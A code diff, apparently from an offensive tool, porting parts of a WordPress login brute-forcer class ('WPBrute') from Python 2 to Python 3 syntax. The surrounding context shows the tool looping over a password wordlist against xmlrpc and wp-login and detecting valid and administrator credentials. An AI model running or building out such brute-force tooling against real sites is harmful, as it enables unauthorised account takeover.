@@ -26,7 +26,7 @@ class WPBrute:
 	def xmlrpc(self):
 		"""Bruteforcing login via xmlrpc"""
 		self.print_.aprint("Starting Bruteforce Login via xmlrpc...")
-		print ""
+		print("")
 		#### 
 		lista = open(self.wordlist,"rb")
 		for pwd in lista:
@@ -46,14 +46,14 @@ class WPBrute:
 				####
 				elif re.search('<name>isAdmin</name><value><boolean>1</boolean>',html):
 					self.print_.dprint("Valid ADMIN Credentials: \"%s\" - \"%s\""%(self.user,pwd.split("\n")[0]))
-			except Exception,e:
+			except Exception:
 				pass
 		sys.exit()
 
 	def wplogin(self):
 		"""Bruteforcing login"""
 		self.print_.aprint("Starting Bruteforce Login via wp-login...")
-		print ""
+		print("")
 		lista = open(self.wordlist,"rb")
 		for pwd in lista:
 			# data
@@ -77,7 +77,7 @@ class WPBrute:
 				#######
 				if re.search('dashboard',html,re.I):
 					sys.exit(self.print_.aprint("Valid Credentials: \"%s\" - \"%s\""%(self.user,pwd.split("\n")[0])))
-			except Exception,e:
+			except Exception:
 				pass
 		sys.exit()
 
